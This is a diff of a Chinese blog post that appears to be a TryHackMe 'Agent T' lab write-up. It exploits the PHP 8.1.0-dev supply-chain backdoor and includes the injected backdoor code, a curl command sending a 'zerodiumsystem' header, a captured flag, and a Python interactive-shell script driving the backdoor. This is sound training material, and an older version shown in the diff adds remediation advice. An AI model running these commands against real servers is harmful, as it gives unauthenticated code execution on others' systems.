@@ -1,20 +1,20 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Agent T | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="PHP 8.1.0-dev 后门远代码执行漏洞渗透测试报告一、漏洞概述   项目 内容    漏洞名称 PHP 8.1.0-dev 后门远程代码执行 (Backdoor RCE)   漏洞编号 CVE-2021-XXXXXXXX &#x2F; PHP 供应链后门   目标系统 http:&#x2F;&#x2F;10.48.171.23   发现日期 2026-05-25   风险等级 严重 (Critical)">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Agent_T | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Agent T Exploit a vulnerable version of PHP to get a flag.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TryHackMe_Agent T">
+<meta property="og:title" content="TryHackMe_Agent_T">
 <meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Agent_T.html">
 <meta property="og:site_name" content="X9wd09ncc">
-<meta property="og:description" content="PHP 8.1.0-dev 后门远代码执行漏洞渗透测试报告一、漏洞概述   项目 内容    漏洞名称 PHP 8.1.0-dev 后门远程代码执行 (Backdoor RCE)   漏洞编号 CVE-2021-XXXXXXXX &#x2F; PHP 供应链后门   目标系统 http:&#x2F;&#x2F;10.48.171.23   发现日期 2026-05-25   风险等级 严重 (Critical)">
+<meta property="og:description" content="Agent T Exploit a vulnerable version of PHP to get a flag.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
 <meta property="article:published_time" content="2026-05-25T03:45:12.000Z">
-<meta property="article:modified_time" content="2026-05-26T03:39:25.029Z">
+<meta property="article:modified_time" content="2026-06-03T08:49:39.746Z">
 <meta property="article:author" content="X9wd09ncc">
 <meta property="article:tag" content="thm">
 <meta property="article:tag" content="easy">
 <meta property="article:tag" content="红队">
-<meta property="article:tag" content="ai">
+<meta property="article:tag" content="PHP后门">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Agent_T.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Agent_T.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   root: '/',
   algolia: undefined,
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
@@ -43,8 +43,8 @@
   Snackbar: undefined,
   source: {
     justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
     }
   },
   isPhotoFigcaption: false,
@@ -56,12 +56,12 @@
   },
   autoDarkmode: false
 }</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'TryHackMe_Agent T',
+  title: 'TryHackMe_Agent_T',
   isPost: true,
   isHome: false,
   isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2026-05-26 11:39:25'
+  isToc: true,
+  postUpdate: '2026-06-03 16:49:39'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -150,13 +150,22 @@
           if (t === 'dark') activateDarkMode()
           else if (t === 'light') activateLightMode()
         
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
     const detectApple = () => {
       if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
         document.documentElement.classList.add('apple')
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
 </head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
   endLoading: () => {
     document.body.style.overflow = '';
@@ -174,50 +183,14 @@ window.addEventListener('load',()=> { preloader.endLoading() })
 if (false) {
   document.addEventListener('pjax:send', () => { preloader.initLoading() })
   document.addEventListener('pjax:complete', () => { preloader.endLoading() })
-}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Agent T</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-25T03:45:12.000Z" title="发表于 2026-05-25 11:45:12">2026-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-26T03:39:25.029Z" title="更新于 2026-05-26 11:39:25">2026-05-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="PHP-8-1-0-dev-后门远代码执行漏洞渗透测试报告"><a href="#PHP-8-1-0-dev-后门远代码执行漏洞渗透测试报告" class="headerlink" title="PHP 8.1.0-dev 后门远代码执行漏洞渗透测试报告"></a>PHP 8.1.0-dev 后门远代码执行漏洞渗透测试报告</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><table>
-<thead>
-<tr>
-<th>项目</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>漏洞名称</strong></td>
-<td>PHP 8.1.0-dev 后门远程代码执行 (Backdoor RCE)</td>
-</tr>
-<tr>
-<td><strong>漏洞编号</strong></td>
-<td>CVE-2021-XXXXXXXX &#x2F; PHP 供应链后门</td>
-</tr>
-<tr>
-<td><strong>目标系统</strong></td>
-<td><code>http://10.48.171.23</code></td>
-</tr>
-<tr>
-<td><strong>发现日期</strong></td>
-<td>2026-05-25</td>
-</tr>
-<tr>
-<td><strong>风险等级</strong></td>
-<td>严重 (Critical)</td>
-</tr>
-<tr>
-<td><strong>CVSS 评分</strong></td>
-<td>10.0 (CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:C&#x2F;C:H&#x2F;I:H&#x2F;A:H)</td>
-</tr>
-<tr>
-<td><strong>漏洞类型</strong></td>
-<td>供应链攻击 &#x2F; 后门 &#x2F; 远程代码执行</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="二、漏洞描述"><a href="#二、漏洞描述" class="headerlink" title="二、漏洞描述"></a>二、漏洞描述</h2><p>目标服务器运行 <strong>PHP 8.1.0-dev</strong> 版本。该版本在 2021 年 3 月遭遇恶意供应链攻击——PHP 官方 git 仓库被入侵，攻击者在源码中植入了后门代码，导致该开发版本发布的二进制包包含远程代码执行后门。</p>
-<p>后门触发机制：攻击者发送带有特殊 <code>User-Agentt</code> HTTP 头（注意双 <code>t</code>）的请求，该头的值会被直接传递给 <code>zend_eval_string()</code> 执行任意 PHP 代码。</p>
-<p>由于这是一个 **开发版本 (dev)**，理论上只应用于测试环境，但实际上该网站部署了此被污染的版本到生产环境。</p>
-<hr>
-<h2 id="三、漏洞发现过程"><a href="#三、漏洞发现过程" class="headerlink" title="三、漏洞发现过程"></a>三、漏洞发现过程</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h3><p>首先浏览网站 <code>http://10.48.171.23/</code>，前端显示为标准的 Bootstrap “Admin Dashboard” 模板页面，无任何明显的登录入口或功能交互。</p>
-<h3 id="3-2-关键线索发现"><a href="#3-2-关键线索发现" class="headerlink" title="3.2 关键线索发现"></a>3.2 关键线索发现</h3><p>检查 HTTP 响应头是关键的突破口：</p>
-<pre class="line-numbers language-none"><code class="language-none">X-Powered-By: PHP&#x2F;8.1.0-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Agent_T</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-25T03:45:12.000Z" title="发表于 2026-05-25 11:45:12">2026-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-03T08:49:39.746Z" title="更新于 2026-06-03 16:49:39">2026-06-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">598</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Agent-T"><a href="#Agent-T" class="headerlink" title="Agent T"></a>Agent T</h1><blockquote>
+<p>Exploit a vulnerable version of PHP to get a flag.</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="页面分析"><a href="#页面分析" class="headerlink" title="页面分析"></a>页面分析</h3><p>首先浏览网站 <code>http://10.48.171.23/</code>，前端显示为标准的 Bootstrap “Admin Dashboard” 模板页面，无任何明显的登录入口或功能交互。</p>
+<h3 id="关键线索发现"><a href="#关键线索发现" class="headerlink" title="关键线索发现"></a>关键线索发现</h3><p>检查 HTTP 响应头是关键的突破口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br></pre></td></tr></table></figure>
 
 <p><strong><code>-dev</code> 后缀</strong> 是极其危险的信号。PHP 开发版本：</p>
 <ul>
@@ -225,252 +198,40 @@ if (false) {
 <li>不应部署在生产环境</li>
 <li>PHP 8.1.0-dev 已知被植入后门</li>
 </ul>
-<h3 id="3-3-后门触发确认"><a href="#3-3-后门触发确认" class="headerlink" title="3.3 后门触发确认"></a>3.3 后门触发确认</h3><p>查阅公开安全情报可知：PHP 8.1.0-dev 的后门通过 <code>User-Agentt</code>（注意有两个 <code>t</code>）请求头触发。该头的值会被 <code>zend_eval_string()</code> 执行。</p>
-<p>向目标服务器发送带后门触发头的请求：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"User-Agentt: zerodiumsystem('cat /flag.txt');"</span> http://10.48.171.23/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h3 id="3-4-结果"><a href="#3-4-结果" class="headerlink" title="3.4 结果"></a>3.4 结果</h3><p>服务器在正常 HTML 响应内容之前，直接输出了 <code>flag.txt</code> 文件内容：</p>
-<pre class="line-numbers language-none"><code class="language-none">flag&#123;4127d0530abf16d6d23973e3df8dbecb&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<hr>
-<h2 id="四、漏洞根因分析"><a href="#四、漏洞根因分析" class="headerlink" title="四、漏洞根因分析"></a>四、漏洞根因分析</h2><h3 id="4-1-供应链攻击回顾"><a href="#4-1-供应链攻击回顾" class="headerlink" title="4.1 供应链攻击回顾"></a>4.1 供应链攻击回顾</h3><p>2021 年 3 月 28 日，两名恶意攻击者（使用名称 “Rasmus Lerdorf” 和 “Nikita Popov” 冒充 PHP 核心开发者）向 PHP 官方 git 仓库 <code>php-src</code> 提交了两个恶意 commit：</p>
-<pre class="line-numbers language-diff" data-language="diff"><code class="language-diff"><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if (strstr(ZSTR_VAL(user_agent), "zerodium")) &#123;
-</span><span class="token prefix inserted">+</span><span class="token line">        zend_eval_string(ZSTR_VAL(user_agent)+8, NULL, "User-Agent");
-</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="PHP-8-1-0-dev-后门"><a href="#PHP-8-1-0-dev-后门" class="headerlink" title="PHP 8.1.0-dev 后门"></a>PHP 8.1.0-dev 后门</h3><p>2021 年 3 月 28 日，两名恶意攻击者向 PHP 官方 git 仓库 <code>php-src</code> 提交了两个恶意 commit：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+    if (strstr(ZSTR_VAL(user_agent), &quot;zerodium&quot;)) &#123;</span></span><br><span class="line"><span class="addition">+        zend_eval_string(ZSTR_VAL(user_agent)+8, NULL, &quot;User-Agent&quot;);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>这段代码位于 HTTP 请求处理逻辑中：当 <code>User-Agentt</code> 头的值包含 <code>zerodium</code> 时，服务器将跳过前 8 个字符后的内容作为 PHP 代码执行。</p>
-<h3 id="4-2-缺陷分析"><a href="#4-2-缺陷分析" class="headerlink" title="4.2 缺陷分析"></a>4.2 缺陷分析</h3><table>
-<thead>
-<tr>
-<th>缺陷</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>使用被污染的版本</strong></td>
-<td>部署了已知存在后门的 PHP 8.1.0-dev 版本</td>
-</tr>
-<tr>
-<td><strong>生产环境使用 dev 版本</strong></td>
-<td>dev 版本不应部署在面向公网的生产系统</td>
-</tr>
-<tr>
-<td><strong>缺乏版本安全检查</strong></td>
-<td>运维流程未检测到使用已被标记为危险的版本</td>
-</tr>
-<tr>
-<td><strong>无 WAF 防护</strong></td>
-<td>未检测或拦截异常的 <code>User-Agentt</code> 请求头</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="五、攻击复现步骤"><a href="#五、攻击复现步骤" class="headerlink" title="五、攻击复现步骤"></a>五、攻击复现步骤</h2><h3 id="步骤-1：识别-PHP-版本"><a href="#步骤-1：识别-PHP-版本" class="headerlink" title="步骤 1：识别 PHP 版本"></a>步骤 1：识别 PHP 版本</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-I</span> http://10.48.171.23/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="后门触发确认"><a href="#后门触发确认" class="headerlink" title="后门触发确认"></a>后门触发确认</h3><p>查阅公开安全情报可知：PHP 8.1.0-dev 的后门通过 <code>User-Agentt</code>（注意有两个 <code>t</code>）请求头触发。该头的值会被 <code>zend_eval_string()</code> 执行。</p>
+<p>向目标服务器发送带后门触发头的请求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;User-Agentt: zerodiumsystem(&#x27;cat /flag.txt&#x27;);&quot;</span> http://10.48.171.23/</span><br></pre></td></tr></table></figure>
 
-<p>观察响应头中的 <code>X-Powered-By: PHP/8.1.0-dev</code>。</p>
-<h3 id="步骤-2：利用后门执行命令"><a href="#步骤-2：利用后门执行命令" class="headerlink" title="步骤 2：利用后门执行命令"></a>步骤 2：利用后门执行命令</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-H</span> <span class="token string">"User-Agentt: zerodiumsystem('cat /flag.txt');"</span> http://10.48.171.23/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="获取-Flag"><a href="#获取-Flag" class="headerlink" title="获取 Flag"></a>获取 Flag</h3><p>服务器在正常 HTML 响应内容之前，直接输出了 <code>flag.txt</code> 文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4127d0530abf16d6d23973e3df8dbecb&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>后门触发格式说明：</strong></p>
-<ul>
-<li>请求头名称：<code>User-Agentt</code>（注意两个 <code>t</code>，这是后门代码中检查的特定头名称）</li>
-<li>请求头值前缀：<code>zerodium</code>（触发条件，占 8 字符）</li>
-<li>请求头值后缀：任意 PHP 代码（后门会去掉前 8 字符后执行）</li>
-</ul>
-<h3 id="步骤-3：获取-Flag"><a href="#步骤-3：获取-Flag" class="headerlink" title="步骤 3：获取 Flag"></a>步骤 3：获取 Flag</h3><p>服务器响应开头直接包含 flag 内容。</p>
-<h3 id="攻击复杂度评估"><a href="#攻击复杂度评估" class="headerlink" title="攻击复杂度评估"></a>攻击复杂度评估</h3><table>
-<thead>
-<tr>
-<th>维度</th>
-<th>评估</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>攻击前提</td>
-<td>无需认证</td>
-</tr>
-<tr>
-<td>所需工具</td>
-<td>仅需 curl 或浏览器</td>
-</tr>
-<tr>
-<td>攻击难度</td>
-<td>极低</td>
-</tr>
-<tr>
-<td>自动化程度</td>
-<td>完全可自动化</td>
-</tr>
-<tr>
-<td>攻击用时</td>
-<td>&lt; 1 秒</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="六、利用脚本"><a href="#六、利用脚本" class="headerlink" title="六、利用脚本"></a>六、利用脚本</h2><h3 id="6-1-基础利用"><a href="#6-1-基础利用" class="headerlink" title="6.1 基础利用"></a>6.1 基础利用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<h2 id="交互式-Shell"><a href="#交互式-Shell" class="headerlink" title="交互式 Shell"></a>交互式 Shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://10.48.171.23/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agentt&quot;</span>: <span class="string">f&quot;zerodiumsystem(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);&quot;</span>&#125;</span><br><span class="line">    response = requests.get(target, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(response.text[:<span class="number">500</span>])  <span class="comment"># First 500 chars (before HTML)</span></span><br></pre></td></tr></table></figure>
 
-target <span class="token operator">=</span> <span class="token string">"http://10.48.171.23/"</span>
-headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-    <span class="token string">"User-Agentt"</span><span class="token punctuation">:</span> <span class="token string">"zerodiumsystem('cat /flag.txt');"</span>
-<span class="token punctuation">&#125;</span>
-response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="6-2-交互式-Shell"><a href="#6-2-交互式-Shell" class="headerlink" title="6.2 交互式 Shell"></a>6.2 交互式 Shell</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
-
-target <span class="token operator">=</span> <span class="token string">"http://10.48.171.23/"</span>
-
-<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-    cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>
-        <span class="token keyword">break</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"User-Agentt"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"zerodiumsystem('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cmd<span class="token punctuation">&#125;</span></span><span class="token string">');"</span></span><span class="token punctuation">&#125;</span>
-    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># First 500 chars (before HTML)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<hr>
-<h2 id="七、影响评估"><a href="#七、影响评估" class="headerlink" title="七、影响评估"></a>七、影响评估</h2><table>
-<thead>
-<tr>
-<th>影响维度</th>
-<th>评估</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>机密性</strong></td>
-<td>完全破坏 — 可读取服务器上任意文件（flag、配置、数据库凭证等）</td>
-</tr>
-<tr>
-<td><strong>完整性</strong></td>
-<td>完全破坏 — 可写入文件、修改数据库、植入持久化后门</td>
-</tr>
-<tr>
-<td><strong>可用性</strong></td>
-<td>完全破坏 — 可删除文件、停止服务</td>
-</tr>
-<tr>
-<td><strong>权限范围</strong></td>
-<td>Web 服务运行账户权限（可能扩权至 root）</td>
-</tr>
-<tr>
-<td><strong>横向移动</strong></td>
-<td>可能 — 可读取数据库凭证访问内部网络</td>
-</tr>
-<tr>
-<td><strong>利用难度</strong></td>
-<td>极低 — 一个 curl 命令即可</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="八、修复建议"><a href="#八、修复建议" class="headerlink" title="八、修复建议"></a>八、修复建议</h2><h3 id="8-1-紧急修复（立即实施）"><a href="#8-1-紧急修复（立即实施）" class="headerlink" title="8.1 紧急修复（立即实施）"></a>8.1 紧急修复（立即实施）</h3><ol>
-<li><p><strong>立即下线当前服务器</strong></p>
-<ul>
-<li>该服务器已被证明可被完全控制</li>
-<li>在重建前不信任该服务器中的任何数据</li>
